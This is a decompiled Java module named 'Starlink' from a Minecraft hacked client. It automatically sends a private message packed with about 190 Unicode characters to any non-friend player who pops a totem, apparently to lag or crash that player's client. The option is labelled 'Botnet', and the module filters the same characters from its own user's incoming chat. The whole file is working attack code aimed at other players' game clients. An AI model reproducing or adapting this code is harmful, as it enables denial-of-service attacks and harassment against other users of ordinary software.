//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Documents\Minecraft-Deobfuscator3000-master\1.12 stable mappings"!

//Decompiled by Procyon!

package me.hollow.realth.client.modules.render;

import me.hollow.realth.client.modules.*;
import me.hollow.realth.api.property.*;
import io.netty.util.internal.*;
import java.util.*;
import net.minecraft.network.play.server.*;
import me.hollow.realth.api.util.*;
import net.b0at.api.event.*;
import net.minecraftforge.fml.common.eventhandler.*;
import me.hollow.realth.client.events.*;
import me.hollow.realth.*;
import net.minecraft.entity.player.*;

@ModuleManifest(label = "Starlink", category = Module.Category.RENDER, listen = false)
public class Starlink extends Module
{
    private static Starlink INSTANCE;
    public Setting<Boolean> ignore;
    public Setting<Boolean> lag;
    public Setting<Integer> pop_delay;
    private final Timer timer;
    protected final Set<String> sent;
    public List<String> unicodeChars;
    
    public Starlink() {
        this.ignore = (Setting<Boolean>)this.register(new Setting("Ignore", (Object)true));
        this.lag = (Setting<Boolean>)this.register(new Setting("Botnet", (Object)false));
        this.pop_delay = (Setting<Integer>)this.register(new Setting("Delay", (Object)2500, (Object)0, (Object)10000, v -> (boolean)this.lag.getValue()));
        this.timer = new Timer();
        this.sent = (Set<String>)new ConcurrentSet();
        this.unicodeChars = new ArrayList<String>();
    }
    
    public String getUnicodeMessage() {
        final StringBuffer sb = new StringBuffer();
        for (final String u : this.unicodeChars) {
            sb.append(u);
        }
        return sb.toString();
    }
    
    public boolean hasUnicode(final String message) {
        for (final String u : this.unicodeChars) {
            if (message.contains(u)) {
                return true;
            }
        }
        return false;
    }
    
    public void onLoad() {
        this.unicodeChars.add("\u0101");
        this.unicodeChars.add("\u0201");
        this.unicodeChars.add("\u0301");
        this.unicodeChars.add("\u0401");
        this.unicodeChars.add("\u0601");
        this.unicodeChars.add("\u0701");
        this.unicodeChars.add("\u0801");
        this.unicodeChars.add("\u0901");
        this.unicodeChars.add("\u0a01");
        this.unicodeChars.add("\u0b01");
        this.unicodeChars.add("\u0e01");
        this.unicodeChars.add("\u0f01");
        this.unicodeChars.add("\u1001");
        this.unicodeChars.add("\u1101");
        this.unicodeChars.add("\u1201");
        this.unicodeChars.add("\u1301");
        this.unicodeChars.add("\u1401");
        this.unicodeChars.add("\u1501");
        this.unicodeChars.add("\u1601");
        this.unicodeChars.add("\u1701");
        this.unicodeChars.add("\u1801");
        this.unicodeChars.add("\u1901");
        this.unicodeChars.add("\u1a01");
        this.unicodeChars.add("\u1b01");
        this.unicodeChars.add("\u1c01");
        this.unicodeChars.add("\u1d01");
        this.unicodeChars.add("\u1e01");
        this.unicodeChars.add("\u1f01");
        this.unicodeChars.add("\u2101");
        this.unicodeChars.add("\u2201");
        this.unicodeChars.add("\u2301");
        this.unicodeChars.add("\u2401");
        this.unicodeChars.add("\u2501");
        this.unicodeChars.add("\u2701");
        this.unicodeChars.add("\u2801");
        this.unicodeChars.add("\u2901");
        this.unicodeChars.add("\u2a01");
        this.unicodeChars.add("\u2b01");
        this.unicodeChars.add("\u2c01");
        this.unicodeChars.add("\u2d01");
        this.unicodeChars.add("\u2e01");
        this.unicodeChars.add("\u2f01");
        this.unicodeChars.add("\u3001");
        this.unicodeChars.add("\u3101");
        this.unicodeChars.add("\u3201");
        this.unicodeChars.add("\u3301");
        this.unicodeChars.add("\u3401");
        this.unicodeChars.add("\u3501");
        this.unicodeChars.add("\u3601");
        this.unicodeChars.add("\u3701");
        this.unicodeChars.add("\u3801");
        this.unicodeChars.add("\u3901");
        this.unicodeChars.add("\u3a01");
        this.unicodeChars.add("\u3b01");
        this.unicodeChars.add("\u3c01");
        this.unicodeChars.add("\u3d01");
        this.unicodeChars.add("\u3e01");
        this.unicodeChars.add("\u3f01");
        this.unicodeChars.add("\u4001");
        this.unicodeChars.add("\u4101");
        this.unicodeChars.add("\u4201");
        this.unicodeChars.add("\u4301");
        this.unicodeChars.add("\u4401");
        this.unicodeChars.add("\u4501");
        this.unicodeChars.add("\u4601");
        this.unicodeChars.add("\u4701");
        this.unicodeChars.add("\u4801");
        this.unicodeChars.add("\u4901");
        this.unicodeChars.add("\u4a01");
        this.unicodeChars.add("\u4b01");
        this.unicodeChars.add("\u4c01");
        this.unicodeChars.add("\u4d01");
        this.unicodeChars.add("\u4e01");
        this.unicodeChars.add("\u4f01");
        this.unicodeChars.add("\u5001");
        this.unicodeChars.add("\u5101");
        this.unicodeChars.add("\u5201");
        this.unicodeChars.add("\u5301");
        this.unicodeChars.add("\u5401");
        this.unicodeChars.add("\u5501");
        this.unicodeChars.add("\u5601");
        this.unicodeChars.add("\u5701");
        this.unicodeChars.add("\u5801");
        this.unicodeChars.add("\u5901");
        this.unicodeChars.add("\u5a01");
        this.unicodeChars.add("\u5b01");
        this.unicodeChars.add("\u5c01");
        this.unicodeChars.add("\u5d01");
        this.unicodeChars.add("\u5e01");
        this.unicodeChars.add("\u5f01");
        this.unicodeChars.add("\u6001");
        this.unicodeChars.add("\u6101");
        this.unicodeChars.add("\u6201");
        this.unicodeChars.add("\u6301");
        this.unicodeChars.add("\u6401");
        this.unicodeChars.add("\u6501");
        this.unicodeChars.add("\u6601");
        this.unicodeChars.add("\u6701");
        this.unicodeChars.add("\u6801");
        this.unicodeChars.add("\u6901");
        this.unicodeChars.add("\u6a01");
        this.unicodeChars.add("\u6b01");
        this.unicodeChars.add("\u6c01");
        this.unicodeChars.add("\u6d01");
        this.unicodeChars.add("\u6e01");
        this.unicodeChars.add("\u6f01");
        this.unicodeChars.add("\u7001");
        this.unicodeChars.add("\u7101");
        this.unicodeChars.add("\u7201");
        this.unicodeChars.add("\u7301");
        this.unicodeChars.add("\u7401");
        this.unicodeChars.add("\u7501");
        this.unicodeChars.add("\u7601");
        this.unicodeChars.add("\u7701");
        this.unicodeChars.add("\u7801");
        this.unicodeChars.add("\u7901");
        this.unicodeChars.add("\u7a01");
        this.unicodeChars.add("\u7b01");
        this.unicodeChars.add("\u7c01");
        this.unicodeChars.add("\u7d01");
        this.unicodeChars.add("\u7e01");
        this.unicodeChars.add("\u7f01");
        this.unicodeChars.add("\u8001");
        this.unicodeChars.add("\u8101");
        this.unicodeChars.add("\u8201");
        this.unicodeChars.add("\u8301");
        this.unicodeChars.add("\u8401");
        this.unicodeChars.add("\u8501");
        this.unicodeChars.add("\u8601");
        this.unicodeChars.add("\u8701");
        this.unicodeChars.add("\u8801");
        this.unicodeChars.add("\u8901");
        this.unicodeChars.add("\u8a01");
        this.unicodeChars.add("\u8b01");
        this.unicodeChars.add("\u8c01");
        this.unicodeChars.add("\u8d01");
        this.unicodeChars.add("\u8e01");
        this.unicodeChars.add("\u8f01");
        this.unicodeChars.add("\u9001");
        this.unicodeChars.add("\u9101");
        this.unicodeChars.add("\u9201");
        this.unicodeChars.add("\u9301");
        this.unicodeChars.add("\u9401");
        this.unicodeChars.add("\u9501");
        this.unicodeChars.add("\u9601");
        this.unicodeChars.add("\u9701");
        this.unicodeChars.add("\u9801");
        this.unicodeChars.add("\u9901");
        this.unicodeChars.add("\u9a01");
        this.unicodeChars.add("\u9b01");
        this.unicodeChars.add("\u9c01");
        this.unicodeChars.add("\u9d01");
        this.unicodeChars.add("\u9e01");
        this.unicodeChars.add("\u9f01");
        this.unicodeChars.add("\ua001");
        this.unicodeChars.add("\ua101");
        this.unicodeChars.add("\ua201");
        this.unicodeChars.add("\ua301");
        this.unicodeChars.add("\ua401");
        this.unicodeChars.add("\ua501");
        this.unicodeChars.add("\ua601");
        this.unicodeChars.add("\ua701");
        this.unicodeChars.add("\ua801");
        this.unicodeChars.add("\ua901");
        this.unicodeChars.add("\uaa01");
        this.unicodeChars.add("\uab01");
        this.unicodeChars.add("\uac01");
        this.unicodeChars.add("\uad01");
        this.unicodeChars.add("\uae01");
        this.unicodeChars.add("\uaf01");
        this.unicodeChars.add("\ub001");
        this.unicodeChars.add("\ub101");
        this.unicodeChars.add("\ub201");
        this.unicodeChars.add("\ub301");
        this.unicodeChars.add("\ub401");
        this.unicodeChars.add("\ub501");
        this.unicodeChars.add("\ub601");
        this.unicodeChars.add("\ub701");
        this.unicodeChars.add("\ub801");
        this.unicodeChars.add("\ub901");
        this.unicodeChars.add("\uba01");
        this.unicodeChars.add("\ubb01");
        this.unicodeChars.add("\ubc01");
        this.unicodeChars.add("\ubd01");
    }
    
    public static Starlink getInstance() {
        if (Starlink.INSTANCE == null) {
            Starlink.INSTANCE = new Starlink();
        }
        return Starlink.INSTANCE;
    }
    
    private void setInstance() {
        Starlink.INSTANCE = this;
    }
    
    public void onDisable() {
        this.sent.clear();
    }
    
    public void onLogout() {
        this.sent.clear();
    }
    
    @EventHandler
    public void onReceive(final PacketEvent.Receive e) {
        if (e.getPacket() instanceof SPacketChat && (boolean)this.ignore.getValue()) {
            final String chat = ((SPacketChat)e.getPacket()).chatComponent.getUnformattedText();
            if (this.hasUnicode(chat)) {
                e.setCancelled(true);
                MessageUtil.sendClientMessage("<Starlink> Unicode detected, message removed!", true);
            }
        }
    }
    
    @SubscribeEvent
    public void onConnection(final ConnectionEvent event) {
        if (this.sent.contains(event.getName())) {
            this.sent.remove(event.getName());
        }
    }
    
    @EventHandler
    public void onTotemPop(final TotemPopEvent event) {
        final EntityPlayer player = event.getEntity();
        if (player.entityId != Starlink.mc.player.entityId && !JordoHack.INSTANCE.getFriendManager().isFriend(player) && !this.sent.contains(player.getName()) && this.timer.passedMs((long)(int)this.pop_delay.getValue()) && (boolean)this.lag.getValue() && this.isEnabled()) {
            Starlink.mc.player.sendChatMessage("/msg " + player.getName() + " " + this.getUnicodeMessage());
            this.sent.add(player.getName());
            this.timer.reset();
        }
    }
    
    static {
        Starlink.INSTANCE = new Starlink();
    }
}
